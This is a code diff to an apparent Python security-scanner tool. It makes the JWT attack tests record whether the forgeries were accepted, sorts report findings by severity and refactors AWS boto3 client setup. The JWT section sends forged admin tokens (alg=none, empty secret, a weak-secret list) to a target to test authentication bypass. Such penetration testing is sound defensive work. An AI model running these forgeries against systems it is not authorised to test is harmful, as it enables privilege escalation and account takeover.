@@ -596,11 +596,13 @@ def test_jwt_attacks(
 
     # Attack 1: alg=none
     none_token = forge_jwt_alg_none(escalated)
+    none_accepted = False
     print("\n[*] Attack 1: alg=none")
     try:
         r = session.get(test_target, headers={header_name: header_prefix + none_token}, timeout=5)
         if _is_admin_response(r):
             print("[!] alg=none ACCEPTED — server allows unsigned tokens")
+            none_accepted = True
         else:
             print(f"[-] alg=none rejected (status={r.status_code})")
     except requests.exceptions.RequestException as e:
@@ -608,11 +610,13 @@ def test_jwt_attacks(
 
     # Attack 2: HS256 with empty secret
     hs256_empty = forge_jwt_hs256(escalated, "")
+    hs256_empty_accepted = False
     print("\n[*] Attack 2: HS256 with empty secret")
     try:
         r = session.get(test_target, headers={header_name: header_prefix + hs256_empty}, timeout=5)
         if _is_admin_response(r):
             print("[!] HS256 with empty secret ACCEPTED")
+            hs256_empty_accepted = True
         else:
             print(f"[-] HS256 empty rejected (status={r.status_code})")
     except requests.exceptions.RequestException as e:
@@ -632,21 +636,28 @@ def test_jwt_attacks(
         "default",
         "changeme",
     ]
-    weak_found = False
+    weak_secret: str | None = None
     for sec in weak_secrets:
         forged = forge_jwt_hs256(escalated, sec)
         try:
             r = session.get(test_target, headers={header_name: header_prefix + forged}, timeout=3)
             if _is_admin_response(r):
                 print(f"[!] HS256 with secret '{sec}' ACCEPTED")
-                weak_found = True
+                weak_secret = sec
                 break
         except requests.exceptions.RequestException:
             continue
-    if not weak_found:
+    if weak_secret is None:
         print("[-] No weak secret matched")
 
-    return {"none": none_token, "hs256_empty": hs256_empty, "decoded": decoded}
+    return {
+        "none": none_token,
+        "none_accepted": none_accepted,
+        "hs256_empty": hs256_empty,
+        "hs256_empty_accepted": hs256_empty_accepted,
+        "weak_secret": weak_secret,
+        "decoded": decoded,
+    }
 
 
 # ============================================================================
@@ -1353,6 +1364,16 @@ SEVERITY_MAP: dict[str, str] = {
 SEVERITY_ORDER: dict[str, int] = {"INFO": 0, "LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}
 
 
+def _finding_severity(finding: dict[str, Any]) -> str:
+    max_sev = "INFO"
+    indicators = finding.get("indicators", []) or [finding.get("type", "unknown")]
+    for indicator in indicators:
+        severity = SEVERITY_MAP.get(str(indicator), "INFO")
+        if SEVERITY_ORDER.get(severity, 0) > SEVERITY_ORDER.get(max_sev, 0):
+            max_sev = severity
+    return max_sev
+
+
 def generate_report(
     scanner_or_findings: SecurityScanner | list[dict[str, Any]],
     target: str | None = None,
@@ -1418,13 +1439,14 @@ def generate_report(
     lines.append("")
 
     lines.extend(["## Findings", ""])
-    for i, f in enumerate(findings, 1):
+    ordered_findings = sorted(
+        findings,
+        key=lambda finding: SEVERITY_ORDER.get(_finding_severity(finding), 0),
+        reverse=True,
+    )
+    for i, f in enumerate(ordered_findings, 1):
         indicators = f.get("indicators", [])
-        max_sev = "INFO"
-        for ind in indicators:
-            s = SEVERITY_MAP.get(ind, "INFO")
-            if SEVERITY_ORDER.get(s, 0) > SEVERITY_ORDER.get(max_sev, 0):
-                max_sev = s
+        max_sev = _finding_severity(f)
 
         lines.extend(
             [
@@ -1578,14 +1600,15 @@ def generate_aws_presigned_url(
     except ImportError as exc:
         raise ImportError("boto3 is required for AWS presigned URL generation") from exc
 
-    client = boto3.client(
-        service,
-        aws_access_key_id=access_key,
-        aws_secret_access_key=secret_key,
-        aws_session_token=session_token,
-        region_name=region,
-        endpoint_url=endpoint_url,
-    )
+    client_kwargs = {
+        "aws_access_key_id": access_key,
+        "aws_secret_access_key": secret_key,
+        "aws_session_token": session_token,
+        "region_name": region,
+    }
+    if endpoint_url:
+        client_kwargs["endpoint_url"] = endpoint_url
+    client = boto3.client(service, **client_kwargs)
 
     method_map = {
         "GetCallerIdentity": "get_caller_identity",
